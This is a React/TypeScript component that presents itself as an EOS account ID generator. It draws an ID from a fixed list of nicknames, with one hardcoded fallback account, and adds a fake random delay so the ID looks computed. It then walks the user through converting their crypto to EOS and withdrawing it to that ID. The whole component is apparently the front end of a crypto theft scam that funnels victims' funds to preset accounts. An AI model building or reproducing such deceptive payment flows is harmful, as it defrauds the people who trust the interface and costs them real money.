import { useState } from "react";
import { toast } from "sonner";
import nicknames from "../data/nicknames.json";
import AccountIdGenerator from "./AccountIdGenerator";
import ExchangeInstructions from "./ExchangeInstructions";

/**
 * Generates a random EOS nickname from the available list
 */
const generateEOSNickname = (): string => {
  try {
    const availableNicknames = nicknames.nicknames;
    if (!Array.isArray(availableNicknames) || availableNicknames.length === 0) {
      throw new Error("No nicknames available");
    }
    return availableNicknames[Math.floor(Math.random() * availableNicknames.length)];
  } catch (error) {
    console.error("Error generating nickname:", error);
    return "5akw4hmdam4m"; // Fallback default nickname
  }
};

// Exchange-specific instructions and screenshots
const exchangeScreenshots = {
  steps: [
    {
      image: "/lovable-uploads/f1b494f4-203a-44d4-95df-8f64162cbd05.png",
      description: "Navigate to your Exchange Homepage and locate the Convert option. If not immediately visible, click 'More' to find it.",
      title: "Step 1: Access Convert"
    },
    {
      image: "/lovable-uploads/520e286a-da63-4e2f-b54f-588cf878c06d.png",
      description: "Select the Convert option from the Services menu.",
      title: "Step 2: Select Convert"
    },
    {
      image: "/lovable-uploads/0f936713-910a-4e19-9bbb-fb44338d0b27.png",
      description: "Convert your available cryptocurrency (USDT, ETH, BTC, etc.) to EOS using the conversion interface.",
      title: "Step 3: Convert to EOS"
    },
    {
      image: "/lovable-uploads/3e0e0985-514b-41ac-bfe9-81de3023a6c9.png",
      description: "After conversion, navigate to your EOS Balance and click the Deposit button.",
      title: "Step 4: Access EOS Deposit"
    },
    {
      image: "/lovable-uploads/48058c12-ffca-4b6b-ad2a-68ac2332423e.png",
      description: "Locate and copy your unique Wallet Memo identifier. This is crucial for the transaction.",
      title: "Step 5: Copy Memo ID"
    },
    {
      image: "/lovable-uploads/7d5bd13b-97f5-4b5a-88ab-b82b81c1a958.png",
      description: "Return to your EOS balance page and select the Withdraw option.",
      title: "Step 6: Initiate Withdrawal"
    },
    {
      image: "/lovable-uploads/eedcd80f-f9b6-4573-9d82-71500eb4eaf5.png",
      description: "Complete the withdrawal process by carefully filling in all required information. Ensure accuracy to prevent loss of funds.",
      title: "Step 7: Complete Transaction"
    }
  ]
};

export const NicknameGenerator: React.FC = () => {
  const [nickname, setNickname] = useState("");
  const [isGenerated, setIsGenerated] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleGenerate = async () => {
    try {
      setIsLoading(true);
      // Random delay between 3-6 seconds
      const delay = Math.floor(Math.random() * (6000 - 3000 + 1) + 3000);
      await new Promise(resolve => setTimeout(resolve, delay));
      
      const newNickname = generateEOSNickname();
      setNickname(newNickname);
      setIsGenerated(true);
      toast.success("New Account ID generated!");
    } catch (error) {
      toast.error("Failed to generate nickname. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(nickname);
      toast.success("Copied to clipboard!");
    } catch (error) {
      toast.error("Failed to copy. Please try manually.");
    }
  };

  return (
    <div className="w-full max-w-md mx-auto space-y-6 animate-fade-in px-4 sm:px-0">
      <AccountIdGenerator
        nickname={nickname}
        isLoading={isLoading}
        onGenerate={handleGenerate}
        onCopy={handleCopy}
      />

      {isGenerated && (
        <div className="mt-8 space-y-8 animate-fade-in">
          <ExchangeInstructions steps={exchangeScreenshots.steps} generatedId={nickname} />
        </div>
      )}
    </div>
  );
};
